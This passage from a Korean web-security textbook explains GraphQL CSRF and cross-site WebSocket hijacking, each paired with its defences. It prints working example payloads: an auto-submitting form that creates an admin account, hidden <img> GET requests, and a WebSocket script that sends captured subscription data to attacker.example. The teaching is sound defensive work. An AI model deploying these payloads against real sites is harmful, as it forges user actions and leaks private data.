이 책은 SSRF를 백엔드 HTTP 요청 인젝션의 맥락에서 이미 다뤘다(→ 28.8). "서버가 임의의 주소로 커넥션을 열 때"(→ 28.8.1) 무슨 일이 벌어지는지, 그리고 입력 검증·네트워크 분할·최소 권한으로 어떻게 막는지가 그곳에 있다. 이 장에서 SSRF를 다시 꺼낸 이유는 방어 기법을 반복하기 위해서가 아니라, **CSRF와 헷갈리지 않도록 방향의 대비를 분명히 하기 위해서다.** 둘 다 "위조된 요청"이지만, 빌리는 신뢰가 다르다 — CSRF는 피해자 브라우저에 저장된 쿠키의 신뢰를, SSRF는 서버가 내부망에서 가진 위치의 신뢰를 빌린다.

## 33.6 GraphQL CSRF — GET 기반 질의, 콘텐츠 타입 우회, 실전 사례

Part VIII의 논지대로, 같은 실패 유형은 새 프로토콜에서 되풀이된다. GraphQL도 CSRF에서 예외가 아니다. GraphQL API는 대개 HTTP 위의 단일 엔드포인트로 통신하고 쿠키로 인증하므로, 33.1에서 본 자동 첨부 문제를 그대로 물려받는다.

**상태 변경 행위 찾기.** GraphQL에서 상태 변경은 보통 **뮤테이션(mutation)** 으로 이뤄진다. CSRF를 노린다면 인트로스펙션으로 뮤테이션 목록을 뽑아 민감한 것을 찾는다.

```graphql
query {
  __schema { mutationType { fields { name } } }
}
```

온라인 서점 GraphQL API라면 `createUser`, `deleteReview`, `changeAddress`, `cancelOrder` 같은 이름이 나올 것이다. 그런데 GraphQL의 특이점은 **질의(query)로도 상태 변경이 일어날 수 있다**는 데 있다. 스키마 설계자가 `deleteAllReviews` 같은 파괴적 동작을 (설계 실수로) 뮤테이션이 아니라 질의로 구현하면, 그것은 질의 목록에서 발견된다. 이 구분이 왜 중요한지는 곧 드러난다.

**POST 기반 CSRF와 콘텐츠 타입 우회.** GraphQL은 관례적으로 요청 본문을 `application/json` 으로 받는다. 그런데 HTML 폼은 **JSON을 보낼 수 없다.** 폼이 쓸 수 있는 인코딩은 `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 셋뿐이다. 그렇다면 폼 기반 CSRF는 GraphQL에 통하지 않아야 할 것 같다. 여기가 함정이다. **일부 GraphQL 서버는 `Content-Type` 이 JSON이 아니어도 본문을 JSON으로 역해석한다.** 이 관대함이 곧 CSRF의 문을 연다.

```html
<html>
  <body>
    <form id="f" method="POST" action="http://books.example.com/graphql">
      <input type="hidden" name="query"
        value="mutation { createUser(username:&quot;attacker&quot;, role:&quot;admin&quot;) { id } }">
    </form>
    <script>document.forms['f'].submit();</script>
  </body>
</html>
```

폼은 `query` 라는 이름의 입력 필드에 뮤테이션 문자열을 담아 `x-www-form-urlencoded` 로 보낸다. `Content-Type` 은 JSON이 아니다. 그러나 서버가 이 본문을 JSON으로 되돌려 파싱하면, 뮤테이션이 실행되고 관리자 계정이 만들어진다. 콘텐츠 타입 검사를 **엄격하게** 하는 것 — JSON이 아닌 본문의 GraphQL 요청을 거부하는 것 — 이 이 경로를 막는 핵심이다.

**GET 기반 CSRF.** 더 위험한 경로는 GET이다. GraphQL 서버는 보통 GET으로 오는 뮤테이션을 거부한다. GET으로 상태를 바꾸는 것은 특히 금기로 여겨지기 때문이다.

```
# curl -X GET "http://books.example.com/graphql?query=mutation%20%7B%20__typename%20%7D"
{"errors":[{"message":"Can only perform a mutation operation from a POST request."}]}
```

이 거부가 GET을 통한 CSRF에 대한 하나의 방어가 된다. 그러나 두 가지 이유로 방어가 뚫린다. 첫째, 앞서 본 **GET으로 실행 가능한 상태 변경 질의**(`deleteAllReviews` 같은)가 있으면, 뮤테이션 거부는 아무 소용이 없다. 질의는 GET으로 허용되기 때문이다. 둘째, GET 요청에는 애플리케이션이 대개 안티 CSRF 방어를 걸지 않는다 — 상태 변경은 다른 메서드로 한다고 가정하기 때문이다.

GET 질의가 허용되면, 요청을 자동으로 발생시키는 무해해 보이는 HTML 태그가 모두 CSRF 벡터가 된다.

```html
<!-- 하이퍼링크: 클릭 시 GET 요청 -->
<a href="http://books.example.com/graphql?query={deleteAllReviews}">경품 확인</a>

<!-- 이미지: 로드 시 자동 GET 요청, 클릭조차 필요 없음 -->
<img src="http://books.example.com/graphql?query={deleteAllReviews}" style="display:none">
```

`<a>` 와 `<img>` 는 GET 요청만 보내므로 안티 CSRF 토큰이 있으면 대개 실패한다. 그러나 토큰 방어가 없는 GET 질의에 대해서는 완벽한 전달 수단이다. 나아가 이 태그들은 **다른 취약점과 결합**한다. HTML 인젝션이 가능한 곳 — 예컨대 서평 본문에 `<img>` 태그를 넣을 수 있는 온라인 서점 — 이라면, 저장된 이미지 태그가 그 페이지를 보는 모든 사용자의 브라우저에서 GET 질의를 발화시킨다. 이것은 33.2의 온사이트 요청 위조가 GraphQL에서 재현된 모습이다. XSS가 아니라 단순 HTML 인젝션만으로 상태 변경이 일어난다.

**자동 탐지.** BatchQL과 GraphQL Cop 같은 도구는 이 조건들을 자동으로 점검한다 — GET 메서드로 질의가 허용되는지, POST로 비 JSON 질의가 통과되는지, 뮤테이션이 GET을 지원하는지. 다만 자동 도구는 오탐이 있으므로 결과는 수동으로 검증해야 한다.

GraphQL CSRF 방어는 REST의 그것과 다르지 않다. 안티 CSRF 토큰(→ 33.4.1), 엄격한 콘텐츠 타입 검사, 그리고 GET으로 상태 변경을 절대 허용하지 않는 것이다. 이 마지막 원칙은 39.8과 짝을 이룬다 — GET 기반 질의는 CSRF의 문을 열 뿐 아니라, 질의 문자열이 캐시와 로그에 남아 데이터를 누출시키는 별개의 문제도 만든다(→ 39.8).

## 33.7 크로스 사이트 WebSocket 하이재킹

CSRF의 마지막 변주는 WebSocket에서 나타난다. **크로스 사이트 WebSocket 하이재킹(cross-site WebSocket hijacking, CSWSH)** 은 WebSocket 통신의 **핸드셰이크** 단계를 겨냥한 CSRF다. GraphQL API가 실시간 업데이트를 위해 서브스크립션(subscription)을 WebSocket으로 구현하면, 이 공격에 노출된다.

WebSocket 연결은 HTTP 요청으로 시작된다(→ 37.4, 37.5). 클라이언트가 업그레이드를 요청하는 이 핸드셰이크에도, 서버가 쿠키 기반 인증을 쓴다면 세션 쿠키가 자동으로 첨부된다.

```
Cookie: session=somesessionID
```

바로 여기가 문제다. CSWSH는 **WebSocket 핸드셰이크에 안티 CSRF 토큰이 없고, 서버가 요청의 출처를 검증하지 않을 때** 성립한다. 그러면 공격자는 피해자의 인증된 세션으로 WebSocket 연결을 열고, 피해자를 대신해 메시지를 주고받는 코드를 작성할 수 있다.

CSWSH가 순수 CSRF보다 위험한 이유가 있다. 일반 CSRF는 단방향 — 요청만 보내고 응답을 읽지 못한다 — 이지만, WebSocket은 양방향 통신 채널이다. 일단 하이재킹된 연결이 열리면, 공격자 코드는 서버가 밀어 보내는 메시지를 **읽어서 유출**할 수 있다. GraphQL 서브스크립션을 하이재킹하는 코드는 대략 이렇다.

```html
<script>
  ws = new WebSocket('ws://books.example.com/subscriptions');
  ws.onopen = function() {
    var query = 'subscription { review { id content ipAddr owner {name} } }';
    ws.send(JSON.stringify({ type: 'start', payload: { query } }));
  };
  ws.onmessage = function(event) {
    // 서버가 보낸 서브스크립션 데이터를 공격자 서버로 유출
    fetch('http://attacker.example/?' + event.data, { mode: 'no-cors' });
  };
</script>
```

피해자가 이 페이지를 열면, 피해자의 브라우저가 그의 쿠키로 WebSocket 핸드셰이크를 완료하고 서브스크립션을 건다. 이후 새 데이터가 도착할 때마다 `onmessage` 핸들러가 그 응답을 공격자 서버로 GET 파라미터에 담아 보낸다. 서브스크립션이 노출하는 필드에 따라 도서 리뷰 내용, 작성자 이름, IP 주소 같은 것이 통째로 빠져나간다. 단방향이라던 CSRF가, 양방향 채널을 타고 데이터 탈취까지 하는 공격이 된다.

**방어.** CSWSH도 CSRF이므로 CSRF 방어가 그대로 적용된다. 안티 CSRF 토큰을 핸드셰이크에 요구하거나, 쿠키가 아닌 인증 방식(JWT 등 헤더 기반)을 쓰면 크로스 사이트 메시지가 인증에 실패한다. 그러나 WebSocket 고유의 핵심 방어는 **`Origin` 헤더 검증**이다. `Origin` 헤더는 핸드셰이크 요청의 출처를 알려 주며, 서버가 이를 검사하지 않으면 위조된 핸드셰이크인지 알 길이 없다. 허가되지 않은 출처의 핸드셰이크에는 `101 Switching Protocols` 가 아니라 `403 Forbidden` 을 돌려줘야 한다.

`Origin` 검증에도 함정이 있다. 서버가 어설프게 검사하면 우회된다. 예컨대 `books.example.com` 만 허용하되 문자열 포함 여부로만 판단하면, 공격자는 `books.example.com.attacker.net` 같은 도메인을 만들어 그 검사를 통과시킨다. `Origin` 은 정확히, 문자열 포함이 아니라 출처 전체가 일치하는지로 검증해야 한다. 이 원리는 34장에서 출처가 어떻게 계산되는지를 다룰 때 정확한 형태를 얻는다(→ 34.1).

CSWSH는 GraphQL 자체의 결함이 아니라 전송 프로토콜 수준의 결함이라는 점을 짚어 둘 만하다. GraphQL 맥락에서는 서브스크립션을 쓰는 API에서만 나타난다. WebSocket 보안 — Origin 검증, 인증 전달, 하이재킹, 프록시 통과 — 의 전모는 37.7이 이어받는다(→ 37.7).

## 이 장의 요약

- **요청 위조의 뿌리는 쿠키 자동 첨부다.** 브라우저는 요청의 출처를 따지지 않고 대상 도메인의 쿠키를 붙인다. 이것은 쿠키가 무상태 HTTP에 연속성을 주기 위해 약속한 편의이지 버그가 아니다. 공격자는 피해자의 토큰을 훔칠 필요 없이 브라우저에게 대신 쓰게 만든다.
- **동일 출처 정책은 요청 발송이 아니라 응답 읽기만 막는다.** 이 비대칭 때문에 순수 CSRF는 쓰기는 유도해도 읽기는 못 하는 단방향 공격이다.
- **온사이트와 크로스 사이트는 위조 요청이 발생하는 위치로 나뉜다.** OSRF는 XSS가 불가능한 곳에서도 성립하며, HTML 인코딩은 브라우저가 target URL을 디코딩하므로 방어가 되지 못한다.
- **클릭재킹은 토큰 방어까지 뚫는다.** 요청이 실제로 표적 애플리케이션 안에서 비롯되기 때문이다. 데이터가 아니라 사용자의 인식을 속이므로 서버 측 검증으로 잡을 수 없고, 프레임버스팅은 신뢰할 방어가 못 된다.
- **CSRF 방어는 각각 막는 것이 다르다.** 토큰은 예측 불가능하고 세션에 결속되어야 하며(23.2와 같은 요구), 재인증은 자동 제출을 막고, Referer는 클라이언트가 넣고 누락될 수 있어 판정 기준이 될 수 없으며(8.6), 쿠키 범위 축소는 노출을 줄일 뿐 CSRF 자체를 막지 못한다(20.8).
- **CSRF와 SSRF는 방향이 반대다.** CSRF는 클라이언트를 시켜 서버에, SSRF는 서버를 시켜 다른 곳에 요청을 보내게 한다. 빌리는 신뢰가 다르다 — 쿠키의 신뢰 대 서버 위치의 신뢰(28.8).
- **GraphQL은 같은 실패를 물려받는다.** GET 기반 질의가 상태를 바꾸거나 서버가 비 JSON 본문을 관대하게 파싱하면, 무해해 보이는 `<a>`·`<img>` 태그와 HTML 폼이 CSRF 벡터가 된다. GET 질의는 39.8의 데이터 누출과도 짝을 이룬다.
- **CSWSH는 단방향 CSRF를 양방향 탈취로 바꾼다.** WebSocket 핸드셰이크에 토큰이 없고 서버가 Origin을 검증하지 않으면, 하이재킹된 연결이 서버 응답까지 유출한다. Origin 검증은 문자열 포함이 아니라 출처 일치로 해야 한다(37.7).

## 이어지는 장

이 장의 거의 모든 논의가 하나의 규칙에 기대고 있었다 — **동일 출처 정책**. CSRF가 단방향인 것도, 클릭재킹이 iframe으로 성립하는 것도, CSWSH의 방어가 Origin 검증인 것도, 모두 "출처가 무엇이고 어떻게 계산되는가"에 달려 있다. 이 장에서는 그 규칙을 "요청은 보내되 응답은 못 읽는다"는 정도로만 썼다. 그러나 출처는 정확히 스킴·호스트·포트의 조합으로 계산되고, 그 판정이 어긋나는 경계마다 새로운 공격이 열린다.

**34장**은 동일 출처 정책을 정면으로 해부한다. 출처가 어떻게 계산되는지, 그 판정이 어느 시점에 어떤 값으로 이뤄지는지, 그리고 그 경계를 의도적으로 여는 장치 — CORS — 가 어떻게 오설정되어 신뢰 경계를 무너뜨리는지를 다룬다. 이 장에서 미뤄 둔 "왜 CSRF는 응답을 못 읽는가"라는 질문의 정확한 답이 그곳에 있다. 그리고 그 경계가 열리는 순간, 단방향이라던 요청 위조가 어떻게 데이터를 읽어 오는 공격으로 바뀌는지도 이어진다.
